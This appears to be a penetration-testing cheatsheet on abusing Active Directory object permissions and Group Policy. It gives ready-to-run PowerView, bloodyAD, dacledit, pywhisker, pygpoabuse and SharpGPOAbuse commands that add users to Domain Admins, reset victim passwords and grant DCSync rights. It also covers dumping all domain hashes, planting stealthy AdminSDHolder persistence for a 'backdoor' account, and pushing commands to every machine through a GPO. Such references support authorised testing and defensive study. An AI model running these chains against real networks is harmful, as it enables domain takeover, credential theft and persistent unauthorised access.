---
tags: [hacking, active-directory, windows, acl, dacl, gpo]
type: cheatsheet
source: compiled reference (AD ACL/GPO abuse) — added beyond base cheatsheet
last-verified: 2026-09-03
---

# ACL & GPO Abuse

## Up
- [[Active Directory]]

Object permissions (DACLs) are the most common non-Kerberos AD privesc path — BloodHound literally draws them as edges. If you have a dangerous right over a user, group, computer, or the domain, you can escalate. (This class wasn't in the base cheatsheet.)

---

## The Dangerous Rights (BloodHound edges)

| Right over an object | What you can do |
|---|---|
| **GenericAll** | Full control — reset password, add SPN, shadow creds, add to group |
| **GenericWrite** | Write attributes → targeted Kerberoast (add SPN), Shadow Credentials, logon script |
| **WriteDACL** | Grant yourself any right (e.g. add DCSync to yourself) |
| **WriteOwner** | Make yourself owner → then WriteDACL → full control |
| **ForceChangePassword** | Reset the target user's password (no old password) |
| **AddMember** (over a group) | Add yourself to the group (e.g. Domain Admins) |
| **AllExtendedRights** | Includes password reset + DCSync (over domain) |
| **GetChanges + GetChangesAll** (over domain) | **DCSync** → dump all hashes |

Enumerate: BloodHound "Owned → shortest path", `Get-DomainObjectAcl -Identity target -ResolveGUIDs` (PowerView), or `dacledit.py` / `bloodyAD`.

---

## Exploitation

```powershell
# PowerView (Windows)
Add-DomainGroupMember -Identity 'Domain Admins' -Members bob            # AddMember
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'New!' -AsPlainText -Force)  # ForceChangePassword
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'} # targeted Kerberoast (then roast, then remove)
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity bob -Rights DCSync  # WriteDACL → grant self DCSync
Set-DomainObjectOwner -Identity target -OwnerIdentity bob              # WriteOwner
```
```bash
# Linux equivalents
bloodyAD -d corp.local -u user -p pass add groupMember 'Domain Admins' bob
bloodyAD -d corp.local -u user -p pass set password victim 'New!'
net rpc password victim 'New!' -U corp.local/user%pass -S <dc>          # ForceChangePassword
dacledit.py -action write -rights DCSync -principal bob -target-dn 'DC=corp,DC=local' corp.local/user:pass
targetedKerberoast.py -d corp.local -u user -p pass                      # add SPN → roast → cleanup
pywhisker.py -d corp.local -u user -p pass --target victim --action add  # Shadow Credentials (see [[Delegation Attacks]])
```

**Chain example:** `WriteOwner → WriteDACL (grant self DCSync) → secretsdump -just-dc` = domain compromise from a single ACL.

---

## AdminSDHolder / SDProp
`CN=AdminSDHolder` holds the template ACL that **SDProp** re-stamps onto all protected (`adminCount=1`) accounts every ~60 min. Write access to AdminSDHolder = **stealthy domain persistence** (your rights get re-applied even after cleanup).

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity backdoor -Rights All
```

---

## GPO Abuse
If you can **edit a GPO** (BloodHound shows GPO edit rights / linked OUs), you push code/config to every computer or user in the linked OU — immediate/organization-wide code exec.

```bash
# add a local admin, immediate scheduled task, or logon script via the GPO
pygpoabuse.py corp.local/user:pass -gpo-id <GPO-GUID> -command 'net localgroup administrators bob /add'
```
```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob --GPOName "Default Domain Policy"
SharpGPOAbuse.exe --AddComputerTask --TaskName "x" --Command cmd.exe --Arguments "/c ..." --GPOName "..."
```
Also read SYSVOL for existing GPO secrets — see **GPP passwords** in [[Lateral Movement & Credential Access]].

---

## Takeaways
- BloodHound edges = a to-do list: **GenericAll/Write → reset/SPN/shadow creds; WriteDACL/Owner → grant self DCSync; AddMember → join Domain Admins.**
- **WriteOwner → WriteDACL → DCSync** is a clean one-object path to the whole domain.
- **AdminSDHolder** and **GPO edit rights** are powerful persistence/mass-exec primitives.
- Most of these turn a *write* right into creds/tickets you then use via [[Kerberos Attacks]] / [[Lateral Movement & Credential Access]].
